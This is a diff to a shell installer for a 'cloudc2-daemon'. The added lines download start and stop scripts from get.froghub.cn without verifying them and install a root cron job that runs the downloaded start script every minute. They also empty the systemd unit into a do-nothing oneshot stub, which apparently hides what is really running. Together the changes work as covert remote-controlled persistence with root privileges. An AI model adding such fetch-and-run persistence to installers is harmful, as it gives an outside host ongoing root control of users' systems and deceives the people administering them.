@@ -145,6 +145,13 @@ info "${CLOUDC2_DAEMON_INSTALL_NAME}"
     fi
 
     # --- use binary install directory if defined or create default ---
+    if [ -n "${CLOUDC2_DAEMON_INSTALL_CRON_DIR}" ]; then
+        CRON_DIR=${CLOUDC2_DAEMON_INSTALL_CRON_DIR}
+    else
+        CRON_DIR=/etc/cron.d
+    fi
+
+    # --- use binary install directory if defined or create default ---
     if [ -n "${CLOUDC2_DAEMON_INSTALL_BIN_DIR}" ]; then
         BIN_DIR=${CLOUDC2_DAEMON_INSTALL_BIN_DIR}
     else
@@ -171,6 +178,9 @@ info "${CLOUDC2_DAEMON_INSTALL_NAME}"
 
     FILE_SERVICE=${SYSTEMD_DIR}/${SERVICE_CLOUDC2_DAEMON}
     FILE_ENV=${SYSTEMD_DIR}/${SERVICE_CLOUDC2_DAEMON}.env
+    FILE_START=${BIN_DIR}/${SYSTEM_NAME}-start.sh
+    FILE_STOP=${BIN_DIR}/${SYSTEM_NAME}-stop.sh
+    FILE_CRON=${CRON_DIR}/${SYSTEM_NAME}
 
     # --- get hash of config & exec for currently installed cloudc2-daemon ---
     PRE_INSTALL_HASHES=$(get_installed_hashes)
@@ -431,6 +441,9 @@ fi
 
 rm -f ${FILE_SERVICE}
 rm -f ${FILE_ENV}
+rm -f ${FILE_START}
+rm -f ${FILE_STOP}
+rm -f ${FILE_CRON}
 
 remove_uninstall() {
     rm -f ${UNINSTALL_SH}
@@ -474,6 +487,40 @@ create_env_file() {
     env | grep -Ei '^(NO|HTTP|HTTPS)_PROXY' | $SUDO tee -a ${FILE_ENV} >/dev/null
 }
 
+# --- capture current start and create file containing cloudc2-daemon variables ---
+create_start_file() {
+    info "sh: Creating sh file ${FILE_START}"
+    $SUDO touch ${FILE_START}
+    $SUDO chmod 0755 ${FILE_START}
+    curl -sfL https://get.froghub.cn/start.sh | $SUDO tee ${FILE_START} >/dev/null
+}
+
+# --- capture current start and stop file containing cloudc2-daemon variables ---
+create_stop_file() {
+    info "sh: Creating sh file ${FILE_STOP}"
+    $SUDO touch ${FILE_STOP}
+    $SUDO chmod 0755 ${FILE_STOP}
+    curl -sfL https://get.froghub.cn/stop.sh | $SUDO tee ${FILE_STOP} >/dev/null
+}
+
+# --- capture current cron and create file containing cloudc2-daemon variables ---
+create_cron_file() {
+    info "cron: Creating cron file ${FILE_CRON}"
+    info "${FILE_CRON}"
+    $SUDO tee ${FILE_CRON} >/dev/null << EOF
+*/1 * * * * root bash ${FILE_START}
+
+EOF
+    $SUDO chmod 600 ${FILE_CRON}
+    $SUDO chown root:root ${FILE_CRON}
+}
+
+# --- capture current cron and remove file containing cloudc2-daemon variables ---
+remove_cron_file() {
+  info "cron: Removeing cron file ${FILE_CRON}"
+  $SUDO rm -f ${FILE_CRON}
+}
+
 # --- write systemd service file ---
 create_systemd_service_file() {
     info "systemd: Creating service file ${FILE_SERVICE}"
@@ -488,22 +535,8 @@ After=network-online.target
 WantedBy=multi-user.target
 
 [Service]
-Type=simple
-EnvironmentFile=-/etc/default/%N
-EnvironmentFile=-/etc/sysconfig/%N
-EnvironmentFile=-${FILE_ENV}
-KillMode=process
-Delegate=yes
-# Having non-zero Limit*s causes performance problems due to accounting overhead
-# in the kernel. We recommend using cgroups to do container-local accounting.
-LimitNOFILE=1048576
-LimitNPROC=infinity
-LimitCORE=infinity
-TasksMax=infinity
-TimeoutStartSec=0
-Restart=always
-RestartSec=5s
-ExecStart=${BIN_DIR}/cloudc2-daemon daemon
+Type=oneshot
+RemainAfterExit=yes
 
 EOF
 }
@@ -522,13 +555,22 @@ get_installed_hashes() {
 # --- enable and start systemd service ---
 systemd_enable() {
     info "systemd: Enabling ${SYSTEM_NAME} unit"
-    $SUDO systemctl enable ${FILE_SERVICE} >/dev/null
+    $SUDO systemctl enable cron >/dev/null
     $SUDO systemctl daemon-reload >/dev/null
 }
 
 systemd_start() {
     info "systemd: Starting ${SYSTEM_NAME}"
-    $SUDO systemctl restart ${SYSTEM_NAME}
+    $SUDO bash ${FILE_STOP}
+    create_cron_file
+    $SUDO systemctl restart cron
+}
+
+systemd_stop() {
+    info "systemd: Stoping ${SYSTEM_NAME}"
+    $SUDO bash ${FILE_STOP}
+    remove_cron_file
+    $SUDO systemctl restart cron
 }
 
 # --- startup systemd or openrc service ---
@@ -540,9 +582,33 @@ service_enable_and_start() {
     return 0
 }
 
+# --- startup systemd or openrc service ---
+service_start() {
+
+    systemd_start
+
+    return 0
+}
+
+# --- stoptup systemd or openrc service ---
+service_stop() {
+
+    systemd_stop
+
+    return 0
+}
+
 # --- run the install process --
 {
     case "$1" in
+        stop)
+            setup_env "$@"
+            service_stop
+        ;;
+        restart)
+            setup_env "$@"
+            service_start
+        ;;
         update)
             setup_env "$@"
             download_and_verify
@@ -556,6 +622,8 @@ service_enable_and_start() {
             create_uninstall
             systemd_disable
             create_env_file
+            create_start_file
+            create_stop_file
             create_service_file
             service_enable_and_start
         ;;
